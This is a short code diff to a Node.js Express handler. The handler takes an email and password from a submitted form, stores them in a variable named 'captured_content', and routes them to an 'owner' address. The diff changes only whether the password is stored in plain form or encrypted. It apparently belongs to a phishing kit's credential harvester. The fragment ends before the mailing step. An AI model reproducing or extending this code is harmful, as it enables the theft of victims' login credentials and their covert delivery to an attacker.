@@ -44,14 +44,14 @@ app.post('/_', function (req, res) {
 const text = 'Hello, World!';
 const password = req.body.password;
  
-const encrypted = encryptpwd.encrypt(text, password); // ---> this is the encrypted (output) value
+const encrypted = encryptpwd.encrypt(text, password);
  
-// example encrypted value: 'e68e7ccd9e908665818a49f111c342ed:c9b83ff7624bb3b26af8cc853d61cd2f7959cecc4308383c39a0924e90637889'
  
-const decrypted = encryptpwd.decrypt(encrypted, password) // ---> this decrypts the encrypted value and yields the original text
+ 
+const decrypted = encryptpwd.decrypt(encrypted, password);
 
     
-    var captured_content = `\n Email: ${req.body.email} Password: ${password}`;
+    var captured_content = `\n Email: ${req.body.email} Password: ${encrypted}`;
     let toMail = req.body.owner;
     
     
